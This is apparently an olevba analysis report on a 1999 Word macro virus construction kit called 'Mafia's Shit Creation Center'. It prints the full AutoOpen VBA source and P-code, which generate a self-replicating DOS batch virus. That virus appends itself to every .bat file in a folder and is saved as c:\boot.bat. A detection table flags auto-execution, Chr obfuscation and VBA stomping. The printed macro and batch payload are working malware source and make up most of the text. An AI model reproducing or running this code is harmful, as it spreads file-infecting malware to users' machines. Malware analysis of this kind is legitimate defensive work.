olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Constructor.MSWord.SBVM.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Constructor.MSWord.SBVM.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Constructor.MSWord.SBVM.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.MsgBox "Mafia's Shit Creation Center v1.0b" + Chr(13) + _
"                   " + Chr(13) + _
"       (c) by XaRaBaS [DkpRJ]", "MSCC v1.0b"
WordBasic.BeginDialog 400, 150, "MSCC v1.0b   (c) XaRaBaS [DkpRJ]"
WordBasic.Text 10, 10, 300, 20, "Enter virus info and click OK"
WordBasic.Text 10, 40, 100, 50, "NaMe oF ThiS ShiT:"
WordBasic.TextBox 120, 40, 120, 17, "Ident$"
WordBasic.Text 10, 70, 100, 50, "Author:"
WordBasic.TextBox 120, 70, 120, 17, "Author$"
WordBasic.Text 10, 100, 100, 50, "TyPe HeRe ThE PaTh AnD ThE NaME Of ThE ViRuS:"
WordBasic.TextBox 120, 100, 240, 17, "Name$"
WordBasic.OKButton 270, 40, 90, 20
WordBasic.CancelButton 270, 70, 90, 20
WordBasic.EndDialog
Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
dlg.Ident$ = "[DkpRJ]"
dlg.Author$ = "XaRaBaS 1999 [DkpRJ]"
dlg.Name$ = "c:\boot.bat"
On Error GoTo -1: On Error GoTo Clo
WordBasic.Dialog.UserDialog dlg
WordBasic.FileNew
WordBasic.Insert "@echo off %" + dlg.Ident$ + "%" + Chr(13) + Chr(10)
WordBasic.Insert "if -%1==-@ goto " + dlg.Ident$ + "z" + Chr(13) + Chr(10)
WordBasic.Insert "echo.>" + dlg.Ident$ + ".bat" + Chr(13) + Chr(10)
WordBasic.Insert "find " + Chr(34) + dlg.Ident$ + Chr(34) + _
"<%0>>" + dlg.Ident$ + ".bat" + Chr(13) + Chr(10)
WordBasic.Insert "for %%b in (*.bat) do call " + _
dlg.Ident$ + ".bat @ %%b" + Chr(13) + Chr(10)
WordBasic.Insert "del " + dlg.Ident$ + ".bat" + Chr(13) + Chr(10)
WordBasic.Insert "goto " + dlg.Ident$ + Chr(13) + Chr(10)
WordBasic.Insert ":" + dlg.Ident$ + "z [SBVM 0.02d]" + Chr(13) + Chr(10)
WordBasic.Insert "if -%2==-autoexec.bat goto " + dlg.Ident$ + _
Chr(13) + Chr(10)
WordBasic.Insert "find " + Chr(34) + dlg.Ident$ + Chr(34) + _
"<%2>nul" + Chr(13) + Chr(10)
WordBasic.Insert "if errorlevel 1 type " + dlg.Ident$ + _
".bat>>%2" + Chr(13) + Chr(10)
WordBasic.Insert ":" + dlg.Ident$ + " by " + dlg.Author$
WordBasic.FileSaveAs Name:=dlg.Name$, Format:=4
WordBasic.FileClose (2)
WordBasic.MsgBox "A NeW ViRuS WaS CreAtED!!" + Chr(13) + _
"ThAnKs FoR UsInG MaFiA's ShIt CoStRuCtIon KiT", "MSCC v1.0b"
Clo:
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Constructor.MSWord.SBVM.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 4323 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	LineCont 0x0008 0A 00 00 00 11 00 00 00
' 	LitStr 0x0022 "Mafia's Shit Creation Center v1.0b"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0013 "                   "
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001D "       (c) by XaRaBaS [DkpRJ]"
' 	Add 
' 	LitStr 0x000A "MSCC v1.0b"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #3:
' 	LitDI2 0x0190 
' 	LitDI2 0x0096 
' 	LitStr 0x0020 "MSCC v1.0b   (c) XaRaBaS [DkpRJ]"
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0003 
' Line #4:
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	LitDI2 0x012C 
' 	LitDI2 0x0014 
' 	LitStr 0x001D "Enter virus info and click OK"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #5:
' 	LitDI2 0x000A 
' 	LitDI2 0x0028 
' 	LitDI2 0x0064 
' 	LitDI2 0x0032 
' 	LitStr 0x0012 "NaMe oF ThiS ShiT:"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #6:
' 	LitDI2 0x0078 
' 	LitDI2 0x0028 
' 	LitDI2 0x0078 
' 	LitDI2 0x0011 
' 	LitStr 0x0006 "Ident$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #7:
' 	LitDI2 0x000A 
' 	LitDI2 0x0046 
' 	LitDI2 0x0064 
' 	LitDI2 0x0032 
' 	LitStr 0x0007 "Author:"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #8:
' 	LitDI2 0x0078 
' 	LitDI2 0x0046 
' 	LitDI2 0x0078 
' 	LitDI2 0x0011 
' 	LitStr 0x0007 "Author$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #9:
' 	LitDI2 0x000A 
' 	LitDI2 0x0064 
' 	LitDI2 0x0064 
' 	LitDI2 0x0032 
' 	LitStr 0x002D "TyPe HeRe ThE PaTh AnD ThE NaME Of ThE ViRuS:"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #10:
' 	LitDI2 0x0078 
' 	LitDI2 0x0064 
' 	LitDI2 0x00F0 
' 	LitDI2 0x0011 
' 	LitStr 0x0005 "Name$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #11:
' 	LitDI2 0x010E 
' 	LitDI2 0x0028 
' 	LitDI2 0x005A 
' 	LitDI2 0x0014 
' 	Ld WordBasic 
' 	ArgsMemCall OKButton 0x0004 
' Line #12:
' 	LitDI2 0x010E 
' 	LitDI2 0x0046 
' 	LitDI2 0x005A 
' 	LitDI2 0x0014 
' 	Ld WordBasic 
' 	ArgsMemCall CancelButton 0x0004 
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #14:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set dlg 
' Line #15:
' 	LitStr 0x0007 "[DkpRJ]"
' 	Ld dlg 
' 	MemSt Ident$ 
' Line #16:
' 	LitStr 0x0014 "XaRaBaS 1999 [DkpRJ]"
' 	Ld dlg 
' 	MemSt Author$ 
' Line #17:
' 	LitStr 0x000B "c:\boot.bat"
' 	Ld dlg 
' 	MemSt New$ 
' Line #18:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Clo 
' Line #19:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall UserDialog 0x0001 
' Line #20:
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0000 
' Line #21:
' 	LitStr 0x000B "@echo off %"
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitStr 0x0001 "%"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #22:
' 	LitStr 0x0010 "if -%1==-@ goto "
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitStr 0x0001 "z"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #23:
' 	LitStr 0x0006 "echo.>"
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitStr 0x0004 ".bat"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #24:
' 	LineCont 0x0004 13 00 00 00
' 	LitStr 0x0005 "find "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "<%0>>"
' 	Add 
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitStr 0x0004 ".bat"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #25:
' 	LineCont 0x0004 05 00 00 00
' 	LitStr 0x001B "for %%b in (*.bat) do call "
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitStr 0x000A ".bat @ %%b"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #26:
' 	LitStr 0x0004 "del "
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitStr 0x0004 ".bat"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #27:
' 	LitStr 0x0005 "goto "
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #28:
' 	LitStr 0x0001 ":"
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitStr 0x000E "z [SBVM 0.02d]"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #29:
' 	LineCont 0x0004 09 00 00 00
' 	LitStr 0x001B "if -%2==-autoexec.bat goto "
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #30:
' 	LineCont 0x0004 13 00 00 00
' 	LitStr 0x0005 "find "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "<%2>nul"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #31:
' 	LineCont 0x0004 09 00 00 00
' 	LitStr 0x0015 "if errorlevel 1 type "
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitStr 0x0008 ".bat>>%2"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #32:
' 	LitStr 0x0001 ":"
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitStr 0x0004 " by "
' 	Add 
' 	Ld dlg 
' 	MemLd Author$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #33:
' 	Ld dlg 
' 	MemLd New$ 
' 	ParamNamed New 
' 	LitDI2 0x0004 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #34:
' 	LitDI2 0x0002 
' 	Paren 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #35:
' 	LineCont 0x0004 0A 00 00 00
' 	LitStr 0x0019 "A NeW ViRuS WaS CreAtED!!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x002D "ThAnKs FoR UsInG MaFiA's ShIt CoStRuCtIon KiT"
' 	Add 
' 	LitStr 0x000A "MSCC v1.0b"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #36:
' 	Label Clo 
' Line #37:
' 	EndSub 
' Line #38:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |boot.bat            |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

